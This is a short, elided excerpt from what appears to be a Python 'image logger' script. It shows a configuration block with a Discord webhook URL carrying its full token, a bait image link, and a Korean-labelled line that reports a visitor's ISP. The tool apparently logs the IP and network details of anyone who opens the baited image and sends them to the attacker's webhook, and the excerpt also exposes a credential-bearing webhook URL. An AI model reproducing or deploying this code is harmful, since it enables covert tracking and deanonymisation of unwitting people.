...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1470600072915058710/SIRj-wb8yzsYxoJVYaqT71WeRGH4IpqW2kwKWrEamcnsZWnlZ8t1YFVDR3EVpw882BYC",
    "image": "https://i.pinimg.com/736x/6b/90/60/6b90600184f44e3fbcca8afb9dc5730c.jpg", # You can also have a custom image by using a URL argument
...
> **제공업체:** `{info['isp'] if info['isp'] else 'Unknown'}`
